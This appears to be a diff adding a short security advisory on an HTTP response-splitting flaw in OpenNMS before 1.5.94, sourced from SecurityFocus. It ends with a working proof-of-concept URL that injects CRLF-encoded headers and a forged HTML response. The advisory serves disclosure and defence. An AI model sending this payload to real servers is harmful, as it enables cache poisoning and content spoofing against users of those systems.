@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/31577/info
+
+OpenNMS is prone to an HTTP response-splitting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Attackers can leverage this issue to influence or misrepresent how web content is served, cached, or interpreted. This could aid in various attacks that try to entice client users into a false sense of trust.
+
+Versions prior to OpenNMS 1.5.94 are vulnerable. 
+
+http://www.example.com/opennms/event/query?%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text
+/html%0D%0AContent-Length:%2036%0D%0A%0D%0A<html><body>BugSec</body></html><!-- 
